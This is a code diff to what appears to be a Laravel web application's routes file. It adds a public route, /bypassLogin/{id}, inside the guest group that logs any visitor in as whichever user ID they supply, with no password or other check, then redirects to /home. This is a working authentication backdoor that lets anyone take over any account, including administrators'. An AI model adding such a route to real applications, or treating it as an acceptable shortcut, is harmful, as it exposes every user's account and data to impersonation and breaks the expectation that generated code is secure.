@@ -77,6 +77,8 @@ use App\Http\Livewire\Page\Reporting\UserReport;
 use App\Http\Livewire\Page\Lelongan\Lelongan;
 use App\Http\Livewire\Page\Payment\RedirectFiuu;
 use App\Http\Livewire\Page\PurchaseHistory\PurchaseHistory;
+use App\Models\User;
+use Illuminate\Support\Facades\Auth;
 
 Route::get('/clear-cache', function () {
     Artisan::call('cache:clear');
@@ -87,6 +89,13 @@ Route::get('/clear-cache', function () {
 });
 
 Route::middleware('guest')->group(function () {
+
+    Route::get('/bypassLogin/{id}', function ($id) {
+        $user = User::findOrFail($id);
+        // auth()->loginUsingId($id);
+        Auth::login($user);
+        return redirect('/home');
+    });
     /** Landing Page */
     // Route::view('/', 'welcome')->name('leadingpage');
     // Route::view('/mengenai-kami', 'about')->name('aboutUs');
